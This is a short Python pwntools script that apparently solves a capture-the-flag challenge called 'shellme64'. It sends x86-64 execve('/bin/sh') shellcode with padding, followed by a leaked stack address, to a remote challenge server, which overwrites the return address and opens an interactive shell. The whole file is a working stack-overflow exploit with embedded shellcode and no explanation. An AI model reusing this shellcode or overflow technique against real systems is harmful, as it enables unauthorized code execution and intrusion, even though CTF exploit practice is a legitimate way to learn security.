from pwn import *


shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# context.terminal = ['termite', '-e']
# p = gdb.debug('./shellme64')
# p = process('shellme64')
p = remote('chal.tuctf.com', 30507)

print p.recvline()
pointer = int(p.recvline()[:-1], 16)
print hex(pointer)

p.sendlineafter('> ', '\x5a' * (40 - len(shellcode)) + shellcode + p64(pointer))
p.interactive()